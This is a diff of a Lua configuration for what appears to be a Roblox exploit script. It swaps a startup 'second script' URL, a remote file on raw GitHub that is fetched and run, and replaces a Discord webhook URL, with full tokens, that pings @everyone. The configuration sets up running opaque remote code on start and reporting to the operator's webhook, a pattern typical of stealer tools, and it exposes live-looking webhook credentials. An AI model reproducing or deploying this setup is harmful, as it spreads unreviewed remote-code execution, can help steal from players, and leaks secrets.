@@ -5,11 +5,11 @@ local CONFIG = {
    
     -- Script extra que se ejecuta al iniciar, puede ser un script de Yisus o cualquier otro script.
     -- Dejar vacio para desactivar
-    SECOND_SCRIPT_URL = "https://raw.githubusercontent.com/carlossano888-create/jesus/refs/heads/main/luraph.lua",
+    SECOND_SCRIPT_URL = "https://raw.githubusercontent.com/rysted-rbx/free/main/silent",
 
     -- (OPCIONAL) webhook de Discord para notificaciones, dejar vacio para desactivar
     WEBHOOK = {
-        URL  = "https://discord.com/api/webhooks/1548878003851886734/p-uYf3F5C-5EbB0y9weTNR81ITo7Y6RYYm28BocuUS06zmPc8_kzqAbzmTKafGIsaprp", -- "https://discord.com/api/webhooks/" webhook de Discord
+        URL  = "https://discord.com/api/webhooks/1558667941686419557/ocNmTWWfJsB1Ki40G5fV98ptZb_dULu3vfnNRhFy6meFw9R38IcNpQpC-7soB9Rxvi7K", -- "https://discord.com/api/webhooks/" webhook de Discord
         PING = "@everyone", -- mencion del mensaje, nil para ninguna
         NOTIFY_WHEN_EMPTY = true,
     },
